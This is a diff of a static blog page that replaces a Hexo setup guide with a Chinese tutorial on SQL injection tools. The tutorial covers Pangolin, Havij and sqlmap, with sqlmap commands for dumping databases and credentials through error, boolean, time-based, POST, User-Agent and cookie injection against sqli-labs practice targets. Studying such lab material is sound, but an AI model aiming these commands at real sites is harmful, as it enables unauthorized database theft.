@@ -4,14 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hexo+Git搭建博客, Broken-year">
-    <meta name="description" content="Hexo+git搭建博客一.准备工作创建github账号这个不用多说，跟着步骤注册，登录后进入仓库
-
-new一个新的仓库
-
-名称填写，用户名加github.io,勾选readme.md
-
-安装git，node.jsNode.js下载地址：h">
+    <meta name="keywords" content="sql注入工具的使用, Broken-year">
+    <meta name="description" content="SQL注入工具的使用网站的一些组合windows+iis（网站服务器）+asp&amp;#x2F;aspx(asp.net)+access&amp;#x2F;mssql【企业内部使用概率大】【打下来是普通用户权限】windows+apache+php+my">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +17,7 @@ new一个新的仓库
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hexo+Git搭建博客 | Broken-year</title>
+    <title>sql注入工具的使用 | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -320,7 +314,7 @@ new一个新的仓库
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hexo+Git搭建博客</h1>
+                    <h1 class="description center-align post-title">sql注入工具的使用</h1>
                 </div>
             </div>
         </div>
@@ -436,12 +430,24 @@ new一个新的仓库
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Hexo/">
-                                <span class="chip bg-color">Hexo</span>
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
                             </a>
                         
-                            <a href="/tags/%E6%95%99%E7%A8%8B/">
-                                <span class="chip bg-color">教程</span>
+                            <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+                                <span class="chip bg-color">工具使用</span>
+                            </a>
+                        
+                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">sql注入</span>
+                            </a>
+                        
+                            <a href="/tags/sql/">
+                                <span class="chip bg-color">sql</span>
+                            </a>
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
                             </a>
                         
                     </div>
@@ -452,8 +458,8 @@ new一个新的仓库
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%8D%9A%E5%AE%A2/" class="post-category">
-                                博客
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络安全
                             </a>
                         
                     </div>
@@ -465,7 +471,7 @@ new一个新的仓库
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-13
+                    2022-03-23
                 </div>
                 
 
@@ -486,45 +492,70 @@ new一个新的仓库
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Hexo-git搭建博客"><a href="#Hexo-git搭建博客" class="headerlink" title="Hexo+git搭建博客"></a>Hexo+git搭建博客</h1><h2 id="一-准备工作"><a href="#一-准备工作" class="headerlink" title="一.准备工作"></a>一.准备工作</h2><h3 id="创建github账号"><a href="#创建github账号" class="headerlink" title="创建github账号"></a>创建github账号</h3><p>这个不用多说，跟着步骤注册，登录后进入仓库</p>
-<p><img src="/2022/03/13/Hexo-Git/git-profile.png" alt="image-20220313150951882"></p>
-<p>new一个新的仓库</p>
-<p><img src="/2022/03/13/Hexo-Git/git-new.png" alt="image-20220313151149841"></p>
-<p>名称填写，用户名加github.io,勾选readme.md</p>
-<p><img src="/2022/03/13/Hexo-Git/git-repository.png" alt="image-20220313151402566"></p>
-<h3 id="安装git，node-js"><a href="#安装git，node-js" class="headerlink" title="安装git，node.js"></a>安装git，node.js</h3><p><strong>Node.js下载地址：</strong><a target="_blank" rel="noopener" href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
-<p><strong>Git：</strong><a target="_blank" rel="noopener" href="https://git-scm.com/">https://git-scm.com/</a></p>
-<p>安装完之后可以通过git bash here打开终端，然后查看版本，就算完成安装了</p>
-<p><img src="/2022/03/13/Hexo-Git/git-v.png" alt="image-20220313152319832"></p>
-<h2 id="二-安装、配置hexo"><a href="#二-安装、配置hexo" class="headerlink" title="二.安装、配置hexo"></a>二.安装、配置hexo</h2><p>新建一个文件夹，用于存放博客，打开Git bash here</p>
-<p>使用npm命令安装Hexo，输入：</p>
-<pre class=" language-git"><code class="language-git">npm install -g hexo-cli
+                <h1 id="SQL注入工具的使用"><a href="#SQL注入工具的使用" class="headerlink" title="SQL注入工具的使用"></a>SQL注入工具的使用</h1><h2 id="网站的一些组合"><a href="#网站的一些组合" class="headerlink" title="网站的一些组合"></a>网站的一些组合</h2><p>windows+iis（网站服务器）+asp&#x2F;aspx(asp.net)+access&#x2F;mssql【企业内部使用概率大】【打下来是普通用户权限】<br>windows+apache+php+mysql&#x3D; wamp（一般使用软件进行集成化搭建)【老版本PHPadmin有漏洞】【打下来是普通用户权限】</p>
+<p>linux+apache&#x2F;nginx+php+mysql &#x3D; lamp&#x2F;lnmp（有可能使用宝塔或者其他面板搭建）【使用较多】【打下来是网站管理的权限】</p>
+<p>linux+tomcat+java(jsp)+oracle&#x2F;mysql 【打下来是root权限】</p>
+<p>linux+nginx+python(django&#x2F;flask)+mysql【新】</p>
+<h2 id="pangolin（穿山甲）"><a href="#pangolin（穿山甲）" class="headerlink" title="pangolin（穿山甲）"></a>pangolin（穿山甲）</h2><blockquote>
+<p>穿山甲作为老牌的SQL注入工具，在注入方面支持多种提交方式，是在手动发现注入点之后，一款比较好用的注入工具。</p>
+</blockquote>
+<p><img src="/2022/03/23/sql-gjsy/image-20220323111431072.png" alt="image-20220323111431072"></p>
+<blockquote>
+<p>查看基本信息</p>
+</blockquote>
+<p><img src="/2022/03/23/sql-gjsy/image-20220323111809951.png" alt="image-20220323111809951"></p>
+<blockquote>
+<p>查看表和数据</p>
+</blockquote>
+<p><img src="/2022/03/23/sql-gjsy/image-20220323111935479.png" alt="image-20220323111935479"></p>
+<h2 id="havij（萝卜头）"><a href="#havij（萝卜头）" class="headerlink" title="havij（萝卜头）"></a>havij（萝卜头）</h2><p><img src="/2022/03/23/sql-gjsy/image-20220323115533965.png" alt="image-20220323115533965"></p>
+<h2 id="sqlmap（sql注入神器）"><a href="#sqlmap（sql注入神器）" class="headerlink" title="sqlmap（sql注入神器）"></a>sqlmap（sql注入神器）</h2><h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><pre><code>sqlmap -u [目标url] --dbs  //获取目标网站数据库库名
+sqlmap -u [目标url] -D security --tables //获取库里的表
+sqlmap -u [目标url] -D security -T users columns //发现id，username，password
+sqlmap -u [目标url] -D security -T users -C username,password --dump //找到数据
+
+完整版命令
+sqlmap -u [目标url] dbs batch threads 10 technique U
+使用sqlmap10线程，忽略错误，使用union select注入网站
 </code></pre>
-<p>安装完成后运行</p>
-<pre class=" language-git"><code class="language-git">hexo init
-npm install
+<h3 id="报错注入（error-based）"><a href="#报错注入（error-based）" class="headerlink" title="报错注入（error based）"></a>报错注入（error based）</h3><blockquote>
+<p>无法发现报错位，但是数据库错了会显示出来</p>
+</blockquote>
+<pre><code>sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique E
 </code></pre>
-<h2 id="三-本地启动Hexo"><a href="#三-本地启动Hexo" class="headerlink" title="三.本地启动Hexo"></a>三.本地启动Hexo</h2><p>输入命令：</p>
-<pre class=" language-git"><code class="language-git">hexo g #生成
-hexo s #启动本地服务器，默认是http://localhost:4000查看
+<h3 id="布尔型注入（booled-based）"><a href="#布尔型注入（booled-based）" class="headerlink" title="布尔型注入（booled based）"></a>布尔型注入（booled based）</h3><blockquote>
+<p>无法发现报错位，数据库被破坏也无法爆出来，但是界面上会出现有和没有东西两种情况</p>
+</blockquote>
+<pre><code>sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique B
 </code></pre>
-<h2 id="四-将Hexo部署到github上"><a href="#四-将Hexo部署到github上" class="headerlink" title="四.将Hexo部署到github上"></a>四.将Hexo部署到github上</h2><h3 id="1-编辑根目录下-config-yml文件"><a href="#1-编辑根目录下-config-yml文件" class="headerlink" title="1.编辑根目录下_config.yml文件"></a>1.编辑根目录下_config.yml文件</h3><pre class=" language-yml"><code class="language-yml"># Deployment
-## Docs: https://hexo.io/docs/deployment.html
-deploy:
-  type: git
-  repo: #仓库地址
-  branch: main
+<h3 id="时间盲注（time-based）"><a href="#时间盲注（time-based）" class="headerlink" title="时间盲注（time based）"></a>时间盲注（time based）</h3><blockquote>
+<p>无法发现报错位，数据库被破坏也无法爆出来，界面上也没有出现或者消失东西的现象</p>
+</blockquote>
+<pre><code>sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique T
 </code></pre>
-<h3 id="2-安装扩展"><a href="#2-安装扩展" class="headerlink" title="2.安装扩展"></a>2.安装扩展</h3><pre class=" language-git"><code class="language-git">npm install hexo-deployer-git --save
+<h3 id="POST方面注入"><a href="#POST方面注入" class="headerlink" title="POST方面注入"></a>POST方面注入</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'unmae'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+select username<span class="token punctuation">,</span>password from users where username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token keyword">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
 </code></pre>
-<h3 id="3-设置用户信息"><a href="#3-设置用户信息" class="headerlink" title="3.设置用户信息"></a>3.设置用户信息</h3><pre class=" language-yml"><code class="language-yml">$ git config --global user.name "注册时候的用户名"          
-$ git config --global user.email  "邮件地址@youremail.com"  
+<pre><code>sqlmap -u http://sqlilabs.njhack.xyz/Less-11/ --data &quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot; --current-db --batch --threads 10 --technique E
+
+--data 后面跟的是post的数据【用purbsuite抓包得到】
+*号标哪，就是让sqlmap打哪
 </code></pre>
-<h3 id="4-添加ssh-key到github上"><a href="#4-添加ssh-key到github上" class="headerlink" title="4.添加ssh key到github上"></a>4.添加ssh key到github上</h3><pre class=" language-yml"><code class="language-yml">ssh-keygen -t rsa -C "邮件地址@youremail.com"   # 生成Key   
-# 在 C:/User/username/.ssh/文件里面 
-ssh -T git@github.com # 测试我们的Key是否添加成功 
-</code></pre>
-<h3 id="5-完成部署，上传"><a href="#5-完成部署，上传" class="headerlink" title="5.完成部署，上传"></a>5.完成部署，上传</h3><pre class=" language-git"><code class="language-git">hexo d
+<p><strong>有的网站可能会搜集用户的浏览器信息：</strong></p>
+<h3 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h3><pre><code>ip地址，user-agent（浏览器信息）,referer（来路）,cookie
+
+sqlmap -u http://sqlilabs.njhack.xyz/Less-18/ --user-agent=&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*&quot; --level 4 --dbs --threads 10 --batch --technique E
+
+# 在使用请求头注入的时候，--level必须大于3
+
+# *号标哪，就是让sqlmap打哪
+
+
+sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie=&quot;uname = admin*;__cfduid=dab97c3dd6a54c5ca485d3e880af5ce271605180690&quot; --level 4 --dbs --threads 10 --batch --technique E
+
+# cookie=？【用purbsuite抓包得到】
+# *号标哪，就是让sqlmap打哪
 </code></pre>
 
                 
@@ -552,7 +583,7 @@ ssh -T git@github.com # 测试我们的Key是否添加成功
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/13/Hexo-Git/">http://Broken-year.github.io/2022/03/13/Hexo-Git/</a>
+                    <a href="http://Broken-year.github.io/2022/03/23/sql-gjsy/">http://Broken-year.github.io/2022/03/23/sql-gjsy/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -590,12 +621,24 @@ ssh -T git@github.com # 测试我们的Key是否添加成功
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Hexo/">
-                                    <span class="chip bg-color">Hexo</span>
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
                                 </a>
                             
-                                <a href="/tags/%E6%95%99%E7%A8%8B/">
-                                    <span class="chip bg-color">教程</span>
+                                <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+                                    <span class="chip bg-color">工具使用</span>
+                                </a>
+                            
+                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">sql注入</span>
+                                </a>
+                            
+                                <a href="/tags/sql/">
+                                    <span class="chip bg-color">sql</span>
+                                </a>
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
                                 </a>
                             
                         </div>
@@ -769,17 +812,18 @@ ssh -T git@github.com # 测试我们的Key是否添加成功
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/14/cs/">
+                <a href="/2022/03/23/sql-gjsy/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="内网渗透随笔之cs">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="sql注入工具的使用">
                         
-                        <span class="card-title">内网渗透随笔之cs</span>
+                        <span class="card-title">sql注入工具的使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -789,9 +833,9 @@ ssh -T git@github.com # 测试我们的Key是否添加成功
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -804,6 +848,7 @@ ssh -T git@github.com # 测试我们的Key是否添加成功
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -815,12 +860,16 @@ ssh -T git@github.com # 测试我们的Key是否添加成功
                         <span class="chip bg-color">工具使用</span>
                     </a>
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">内网渗透</span>
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">sql注入</span>
                     </a>
                     
-                    <a href="/tags/cs/">
-                        <span class="chip bg-color">cs</span>
+                    <a href="/tags/sql/">
+                        <span class="chip bg-color">sql</span>
+                    </a>
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
@@ -831,16 +880,16 @@ ssh -T git@github.com # 测试我们的Key是否添加成功
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/13/Hexo-Git/">
+                <a href="/2022/03/22/php-sql/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Hexo+Git搭建博客">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="php和数据库">
                         
-                        <span class="card-title">Hexo+Git搭建博客</span>
+                        <span class="card-title">php和数据库</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -851,30 +900,33 @@ ssh -T git@github.com # 测试我们的Key是否添加成功
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%8D%9A%E5%AE%A2/" class="post-category">
-                                    博客
+                            <a href="/categories/PHP/" class="post-category">
+                                    PHP
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Hexo/">
-                        <span class="chip bg-color">Hexo</span>
+                    <a href="/tags/%E7%BC%96%E7%A8%8B/">
+                        <span class="chip bg-color">编程</span>
                     </a>
                     
-                    <a href="/tags/%E6%95%99%E7%A8%8B/">
-                        <span class="chip bg-color">教程</span>
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                    <a href="/tags/mysql/">
+                        <span class="chip bg-color">mysql</span>
                     </a>
                     
                 </div>
